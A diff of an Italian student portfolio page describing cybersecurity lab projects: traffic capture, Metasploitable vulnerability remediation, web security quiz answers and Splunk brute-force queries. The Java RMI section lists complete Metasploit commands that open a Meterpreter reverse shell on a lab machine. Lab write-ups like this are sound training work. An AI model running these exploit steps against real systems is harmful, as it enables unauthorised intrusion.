@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Progetti Cybersecurity – Isabelle Adjoké Adjetey</title>
+  <title>Progetti Cybersecurity – Isabelle Adjetey</title>
   <style>
     body { font-family: 'Segoe UI', sans-serif; background-color: #f4f4f4; padding: 2em; margin: 0; }
     h1 { text-align: center; color: #1a237e; }
@@ -40,6 +40,184 @@
 <body>
 
   <h1>📁 Progetti in Cybersecurity</h1>
+
+
+  <div class="project">
+  <h2>🌐 Simulazione Client-Server con Intercettazione HTTPS/HTTP</h2>
+  <p><strong>Tool:</strong> Kali Linux (192.168.32.100), Windows 7 (192.168.32.101), BIND9, Apache (HTTP/HTTPS), Wireshark, Chrome/Firefox</p>
+  <p><strong>Obiettivi:</strong><br>
+    Configurare DNS per epicode.internal → 192.168.32.100;<br>
+    attivare server HTTPS con certificato autofirmato;<br>
+    catturare traffico HTTPS e HTTP;<br>
+    analizzare differenze in termini di visibilità e sicurezza
+  </p>
+  <p><strong>Risultati:</strong><br>
+    Identificati MAC address di sorgente e destinazione;<br>
+    traffico HTTPS criptato (payload non leggibile, solo handshake TLS visibile);<br>
+    traffico HTTP in chiaro (richieste e risposte completamente leggibili)
+  </p>
+  <img src="URL-dello-screenshot-HTTPS" alt="Handshake TLS in Wireshark">
+  <img src="URL-dello-screenshot-HTTP" alt="Richiesta HTTP in Wireshark">
+
+  <div class="project-pdf">
+    <a href="https://github.com/tuo-username/simulazione-client-server/report.pdf?raw=true" target="_blank">
+      Scarica il PDF di svolgimento del progetto
+    </a>
+  </div>
+
+  <p class="tags">#DNS #HTTPS #HTTP #Wireshark #NetworkLab #Security</p>
+</div>
+
+
+<div class="project">
+  <h2>🎮 GameShell Shell Familiarization</h2>
+  <p><strong>Tool:</strong> Kali Linux, apt, shell utilities (gettext, man-db, procps, psmisc, nano, tree, bsdmainutils, x11-apps), wget</p>
+  <p><strong>Obiettivi:</strong><br>
+    Installare GameShell per esercitarsi con i comandi di shell in ambiente Kali Linux
+  </p>
+  <p><strong>Installazione:</strong><br>
+    sudo apt update<br>
+    sudo apt install gettext man-db procps psmisc nano tree bsdmainutils x11-apps wget<br>
+    wget https://github.com/phyver/GameShell/releases/download/latest/gameshell.sh
+  </p>
+  <p><strong>Avvio del gioco:</strong><br>
+    bash gameshell.sh
+  </p>
+  <p><strong>Sviluppo del gioco:</strong><br>
+    Cercate di completare quanti più livelli possibili
+  </p>
+  <div class="project-github">
+    <a href="https://github.com/phyver/GameShell" target="_blank">
+      Vai al repository GitHub di GameShell
+    </a>
+  </div>
+  <p class="tags">#GameShell #ShellExercise #KaliLinux</p>
+</div>
+
+
+<div class="project">
+  <h2>🔍 Vulnerability Assessment & Remediation su Metasploitable</h2>
+  <p><strong>Tool:</strong> Kali Linux, Nmap, Nessus, iptables</p>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    Effettuare una scansione completa sul target Metasploitable;<br>
+    selezionare da 2 a 4 vulnerabilità critiche (evidenziate in giallo);<br>
+    implementare azioni di rimedio (patch o regole firewall);<br>
+    rieseguire la scansione e confrontare i risultati
+  </p>
+  <p><strong>Consegna:</strong></p>
+  <ul>
+    <li>
+      <a href="https://github.com/tuo-username/metasploitable-remediation/ScansioneInizio.pdf?raw=true" target="_blank">
+        📄 ScansioneInizio.pdf
+      </a>  
+      (grafico vulnerabilità iniziali)
+    </li>
+    <li>
+      <a href="https://github.com/tuo-username/metasploitable-remediation/RemediationMeta.pdf?raw=true" target="_blank">
+        📄 RemediationMeta.pdf
+      </a>  
+      (screenshot e spiegazione dei passaggi di remediation)
+    </li>
+    <li>
+      <a href="https://github.com/tuo-username/metasploitable-remediation/ScansioneFine.pdf?raw=true" target="_blank">
+        📄 ScansioneFine.pdf
+      </a>  
+      (grafico vulnerabilità dopo le modifiche)
+    </li>
+  </ul>
+  <p class="tags">#Metasploitable #VulnerabilityAssessment #Nmap #Nessus #Remediation #iptables</p>
+</div>
+
+<div class="project">
+  <h2>🛠️ Java RMI Exploitation su Metasploitable</h2>
+  <p><strong>Tool:</strong> Kali Linux (192.168.11.111), Metasploit Framework, Metasploitable (192.168.11.112)</p>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    La macchina vittima espone un servizio Java RMI vulnerabile sulla porta 1099.  
+    Utilizzare Metasploit per ottenere una sessione Meterpreter.<br>
+    Kali IP: 192.168.11.111 – Metasploitable IP: 192.168.11.112
+  </p>
+  <p><strong>Procedura:</strong><br>
+    • msfconsole<br>
+    • use exploit/multi/misc/java_rmi_server<br>
+    • set RHOST 192.168.11.112<br>
+    • set RPORT 1099<br>
+    • set PAYLOAD java/meterpreter/reverse_tcp<br>
+    • set LHOST 192.168.11.111<br>
+    • exploit
+  </p>
+  <p><strong>Evidenze raccolte:</strong><br>
+    • ip addr (configurazione di rete)<br>
+    • ip route show (tabella di routing)<br>
+    • <em>altri comandi e output rilevanti</em>
+  </p>
+  <p class="tags">#JavaRMI #Metasploit #Meterpreter #Exploit #Metasploitable</p>
+</div>
+
+<div class="project">
+  <h2>🛡️ Web App Security Analysis & Response</h2>
+  <p><strong>Traccia & Requisiti:</strong><br>
+    Con riferimento alla figura in slide 2, rispondere ai seguenti quesiti sulla protezione e gestione di un’applicazione Web esposta in DMZ.
+  </p>
+  <p><strong>Quesiti e Soluzioni:</strong></p>
+  <ol>
+    <li>
+      <strong>Azioni preventive:</strong><br>
+      Identificare e posizionare filtri WAF o input‐validation per prevenire SQLi e XSS.  
+      <em>(Modificare slide 2 evidenziando i filtri a livello di WAF e di codice applicativo.)</em>
+    </li>
+    <li>
+      <strong>Impatti sul business:</strong><br>
+      Un DDoS di 10 minuti interrompe il servizio.  
+      Impatto = 10 min × 1.500 €/min = 15.000 €.  
+      Proposte preventive: CDN con rate‐limiting, soluzioni di anti‐DDoS.
+    </li>
+    <li>
+      <strong>Response:</strong><br>
+      In caso di infezione malware, isolare il server infetto (network quarantine) senza rimuovere l’accesso all’attaccante.  
+      <em>(Aggiornare slide 2 con la VLAN di quarantena e regole di ACL sul firewall.)</em>
+    </li>
+    <li>
+      <strong>Soluzione completa:</strong><br>
+      Combinare le azioni preventive (punto 1) e la response (punto 3) in un unico diagramma.
+    </li>
+    <li>
+      <strong>Modifica “più aggressiva” (opzionale):</strong><br>
+      Introdurre un IDS/IPS centralizzato e segmentazione della rete interna per mitigare ulteriormente gli attacchi (punto 2).
+    </li>
+  </ol>
+  <p class="tags">#WebSecurity #SQLi #XSS #DDoS #IncidentResponse #WAF #NetworkSegmentation</p>
+</div>
+
+
+
+<div class="project">
+  <h2>📊 Splunk Log Analysis Lab</h2>
+  <p><strong>Tool:</strong> Splunk Enterprise (dati di esempio “tutorialdata.zip”)</p>
+  <p><strong>Obiettivi:</strong><br>
+    Importare “tutorialdata.zip” in Splunk ed eseguire query SPL per analizzare autenticazioni SSH e errori server.</p>
+  <p><strong>Query Principali:</strong><br>
+    1. Failed password:<br>
+    <code>index=main "Failed password" | table _time, src_ip, user, message</code><br>
+    2. Sessioni SSH riuscite per djohnson:<br>
+    <code>index=main "session opened for user" user="djohnson" | table _time, user, uid</code><br>
+    3. Tentativi falliti da 86.212.199.60:<br>
+    <code>index=main "Failed password" src_ip="86.212.199.60" | table _time, user, dest_port</code><br>
+    4. IP con più di 5 tentativi falliti:<br>
+    <code>index=main "Failed password" | stats count by src_ip | where count > 5</code><br>
+    5. Internal Server Error:<br>
+    <code>index=main status=500 OR "Internal Server Error" | table _time, src_ip, message</code>
+  </p>
+  <p><strong>Conclusioni (AI):</strong><br>
+    L'analisi mostra un piccolo cluster di IP responsabili di numerosi tentativi di “Failed password”, suggerendo un attacco brute-force. Gli errori 500 appaiono sporadici, indicativi di possibili instabilità applicativa da approfondire.</p>
+  <div class="project-github">
+    <a href="https://github.com/tuo-username/splunk-log-analysis" target="_blank">
+      Vai al repository GitHub di Splunk Log Analysis
+    </a>
+  </div>
+  <p class="tags">#Splunk #LogAnalysis #SSH #SIEM #SecurityAnalytics</p>
+</div>
+
+
 
   <div class="project">
     <h2>🛠️ Penetration Testing Lab</h2>
